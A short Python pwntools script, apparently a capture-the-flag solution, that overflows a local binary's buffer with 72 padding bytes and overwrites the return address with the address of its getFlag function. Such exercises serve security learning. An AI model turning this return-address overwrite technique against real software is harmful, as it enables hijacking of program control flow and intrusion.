import pwn
p = pwn.process("./bluff_overflow.exe")
elf = pwn.ELF("./bluff_overflow.exe")
p.sendline(b"A"*(72)+pwn.p64(elf.symbols["getFlag"]))
p.interactive()